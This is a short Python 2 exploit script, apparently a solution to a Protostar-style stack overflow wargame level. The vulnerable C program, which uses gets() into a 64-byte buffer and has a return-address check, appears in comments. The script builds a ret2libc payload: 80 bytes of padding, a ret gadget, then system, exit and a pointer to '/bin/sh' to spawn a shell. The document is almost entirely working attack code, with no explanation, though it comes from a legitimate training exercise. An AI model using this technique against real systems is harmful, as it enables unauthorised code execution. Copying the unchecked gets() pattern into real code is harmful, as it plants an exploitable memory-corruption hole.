# #include <stdlib.h>
# #include <unistd.h>
# #include <stdio.h>
# #include <string.h>

# char *getpath() {
#   char buffer[64];
#   unsigned int ret;

#   printf("input path please: "); fflush(stdout);

#   gets(buffer);

#   ret = __builtin_return_address(0);

#   if((ret & 0xb0000000) == 0xb0000000) {
#       printf("bzzzt (%p)\n", ret);
#       _exit(1);
#   }

#   printf("got path %s\n", buffer);
#   return strdup(buffer);
# }

# int main(int argc, char **argv) {
#   getpath();
# }

import struct
padding = 'A'*80
eip = struct.pack('I', 0x08048544) #address of return instruction in getpath
eip2 = struct.pack('I', 0xb7ecffb0) #address of system
return_stack = struct.pack('I', 0xb7ec60c0) #address of exit
shell = struct.pack('I', 0xb7e97000+0x11f3bf) #pointer to string '/bin/sh'
print padding+eip+eip2+return_stack+shell